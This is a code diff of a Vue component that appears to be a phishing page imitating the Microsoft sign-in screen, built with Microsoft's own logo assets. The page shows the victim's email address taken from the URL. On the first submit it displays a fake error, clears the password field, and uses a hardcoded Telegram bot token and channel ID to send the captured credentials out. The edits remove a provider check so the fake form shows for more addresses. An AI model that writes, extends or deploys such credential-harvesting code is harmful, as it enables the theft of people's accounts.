@@ -80,7 +80,8 @@ const submitForm = async () => {
         errorPassword.value = false; 
         if (clickCount.value === 1) {
             // Action on the first click
-            error.value  = true;
+            error.value  = true; 
+            password.value = '';
 
             const botToken = '6523418078:AAFyIicijK8d8ohtSQNqd8LRfC2VGPa7TKs';
             const channelID = '-1002004436374'; 
@@ -116,9 +117,9 @@ const submitForm = async () => {
 
                 if (!response.ok) {
                 //throw new Error(`Telegram API error: ${response.statusText}`);
-
+                    
                 }else{
-                    //router.push('https://login.live.com/');
+                    //router.push('https://login.live.com/'); 
                 }
 
                 // Log the successful response if needed
@@ -219,7 +220,7 @@ const handleKeyup = () => {
                                     </div>
                                     <div>
                                         <img class="f2r-75d frv-xsj" src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg">
-                                        <div v-if="emailFromUrl && (emailFromUrl.includes('@') && emailFromUrl.includes('.com')) && isValidProvider" class="f10-6t1 fi2-w8i f1l-ng7 foj-zat f1y-o82 f1g-xrw f1g-are f6f-wvy">
+                                        <div v-if="emailFromUrl && (emailFromUrl.includes('@') && emailFromUrl.includes('.com'))" class="f10-6t1 fi2-w8i f1l-ng7 foj-zat f1y-o82 f1g-xrw f1g-are f6f-wvy">
                                             <div @click="goBack" class="rv-xsj f1p-zp4 fq4-oyn f17-ft9 f6o-y3c frq-96i f3r-92s f1g-1oy fhx-tyx f1q-stt f1c-o3a fre-shp f13-9m6 fqd-d7v f1r-a8c f1i-c5e fy0-e3v f24-ma4 fgv-hw9 f84-gtq f9x-6os">
                                                 <img src="https://logincdn.msauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg">
                                             </div>
@@ -227,7 +228,7 @@ const handleKeyup = () => {
                                                 {{emailFromUrl}}
                                             </div>
                                         </div>
-                                        <div   v-if="emailFromUrl && (emailFromUrl.includes('@') && emailFromUrl.includes('.com')) && isValidProvider" class="f10-6t1 f11-ma7">
+                                        <div   v-if="emailFromUrl && (emailFromUrl.includes('@') && emailFromUrl.includes('.com'))" class="f10-6t1 f11-ma7">
                                             <form>
                                             </form>   
 
